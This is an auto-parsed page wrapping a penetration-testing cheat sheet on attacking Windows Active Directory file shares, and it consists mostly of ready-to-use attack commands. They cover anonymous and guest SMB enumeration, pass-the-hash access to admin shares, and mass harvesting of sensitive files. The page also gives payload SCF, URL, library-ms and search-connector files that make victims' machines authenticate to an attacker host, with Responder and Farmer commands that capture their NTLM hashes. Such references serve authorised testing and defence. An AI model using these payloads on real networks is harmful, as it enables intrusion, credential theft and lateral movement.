---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Internal - Shares

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-internal-shares` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-shares.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Internal - Shares](../../topics/active-directory/internal-shares.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-internal-shares |
| name | Internal - Shares |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/internal-shares.md |

## Preserved Source Material

````yaml
_body: "# Internal - Shares\n\n## READ Permission\n\n> Some shares can be accessible without authentication, explore them\
  \ to find some juicy files\n\n* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) - The Network Execution Tool\n\
  \n  ```ps1\n  nxc smb 10.0.0.4 -u guest -p '' -M spider_plus\n  nxc smb 10.0.0.4 -u guest -p '' --get-file \\\\info.txt.txt\
  \ infos.txt.txt  --share OPENSHARE\n  ```\n\n* [ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap) - a handy SMB\
  \ enumeration tool\n\n  ```powershell\n  smbmap -H 10.10.10.10                # null session\n  smbmap -H 10.10.10.10 -r\
  \ PATH        # recursive listing\n  smbmap -H 10.10.10.10 -u invaliduser # guest smb session\n  smbmap -H 10.10.10.10 -d\
  \ \"DOMAIN.LOCAL\" -u \"USERNAME\" -p \"Password123*\"\n  ```\n\n* [byt3bl33d3r/pth-smbclient](https://github.com/byt3bl33d3r/pth-toolkit)\
  \ from path-toolkit\n\n  ```powershell\n  pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\"\
  \ //192.168.10.100/Share\n  pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/C$\n\
  \  ls  # list files\n  cd  # move inside a folder\n  get # download files\n  put # replace a file\n  ```\n\n* [SecureAuthCorp/smbclient](https://github.com/SecureAuthCorp/impacket)\
  \ from Impacket\n\n  ```powershell\n  smbclient -I 10.10.10.100 -L ACTIVE -N -U \"\"\n          Sharename       Type   \
  \   Comment\n          ---------       ----      -------\n          ADMIN$          Disk      Remote Admin\n          C$\
  \              Disk      Default share\n          IPC$            IPC       Remote IPC\n          NETLOGON        Disk \
  \     Logon server share\n          Replication     Disk      \n          SYSVOL          Disk      Logon server share\n\
  \          Users           Disk\n  use Sharename # select a Sharename\n  cd Folder     # move inside a folder\n  ls    \
  \        # list files\n  ```\n\n* [smbclient](https://www.samba.org/samba/docs/4.9/man-html/smbclient.1.html) - from Samba,\
  \ ftp-like client to access SMB/CIFS resources on servers\n\n  ```powershell\n  smbclient -U username //10.0.0.1/SYSVOL\n\
  \  smbclient //10.0.0.1/Share\n\n  # Download a folder recursively\n  smb: \\> mask \"\"\n  smb: \\> recurse ON\n  smb:\
  \ \\> prompt OFF\n  smb: \\> lcd '/path/to/go/'\n  smb: \\> mget *\n  ```\n\n* [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)\
  \ - a tool for pentesters to help find delicious candy\n\n  ```ps1\n  snaffler.exe -s - snaffler.log\n\n  # Snaffle all\
  \ the computers in the domain\n  ./Snaffler.exe -d domain.local -c <DC> -s\n\n  # Snaffle specific computers\n  ./Snaffler.exe\
  \ -n computer1,computer2 -s\n  ​\n  # Snaffle a specific directory\n  ./Snaffler.exe -i C:\\ -s\n  ```\n\n## WRITE Permission\n\
  \nWrite SCF and URL files on a writeable share to farm for user's hashes and eventually replay them.\n\nTheses attacks can\
  \ be automated with [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) and [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)\n\
  \n```ps1\n# Farmer to receive auth\nfarmer.exe <port> [seconds] [output]\nfarmer.exe 8888 0 c:\\windows\\temp\\test.tmp\
  \ # undefinitely\nfarmer.exe 8888 60 # one minute\n\n# Crop can be used to create various file types that will trigger SMB/WebDAV\
  \ connections for poisoning file shares during hash collection attacks\ncrop.exe <output folder> <output filename> <WebDAV\
  \ server> <LNK value> [options]\nCrop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico\n\
  Crop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec\n```\n\n### SCF Files\n\nDrop the\
  \ following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`\n\
  \n```powershell\n[Shell]\nCommand=2\nIconFile=\\\\10.10.10.10\\Share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n```\n\n\
  Using [`netexec`](https://github.com/Pennyw0rth/NetExec/blob/master/cme/modules/slinky.py):\n\n```ps1\nnetexec smb 10.10.10.10\
  \ -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf\nnetexec smb 10.10.10.10 -u username -p password\
  \ -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk\nnetexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK\
  \ SERVER=IP_RESPONDER CLEANUP\n```\n\n### URL Files\n\nThis attack also works with `.url` files and `responder -I eth0 -v`.\n\
  \n```powershell\n[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\10.10.10.10\\%USERNAME%.icon\n\
  IconIndex=1\n```\n\n### Windows Library Files\n\n> Windows Library Files (.library-ms)\n\n```xml\n<?xml version=\"1.0\"\
  \ encoding=\"UTF-8\"?>\n<libraryDescription xmlns=\"<http://schemas.microsoft.com/windows/2009/library>\">\n  <name>@windows.storage.dll,-34582</name>\n\
  \  <version>6</version>\n  <isLibraryPinned>true</isLibraryPinned>\n  <iconReference>imageres.dll,-1003</iconReference>\n\
  \  <templateInfo>\n    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n  </templateInfo>\n  <searchConnectorDescriptionList>\n\
  \    <searchConnectorDescription>\n      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n      <isSupported>false</isSupported>\n\
  \      <simpleLocation>\n        <url>\\\\\\\\workstation@8888\\\\folder</url>\n      </simpleLocation>\n    </searchConnectorDescription>\n\
  \  </searchConnectorDescriptionList>\n</libraryDescription>\n```\n\n### Windows Search Connectors Files\n\n> Windows Search\
  \ Connectors (.searchConnector-ms)\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<searchConnectorDescription xmlns=\"\
  <http://schemas.microsoft.com/windows/2009/searchConnector>\">\n    <iconReference>imageres.dll,-1002</iconReference>\n\
  \    <description>Microsoft Outlook</description>\n    <isSearchOnlyItem>false</isSearchOnlyItem>\n    <includeInStartMenuScope>true</includeInStartMenuScope>\n\
  \    <iconReference>\\\\\\\\workstation@8888\\\\folder.ico</iconReference>\n    <templateInfo>\n        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>\n\
  \    </templateInfo>\n    <simpleLocation>\n        <url>\\\\\\\\workstation@8888\\\\folder</url>\n    </simpleLocation>\n\
  </searchConnectorDescription>\n```\n\n## References\n\n* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)"
_relative_path: active-directory/internal-shares.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-shares.md
````
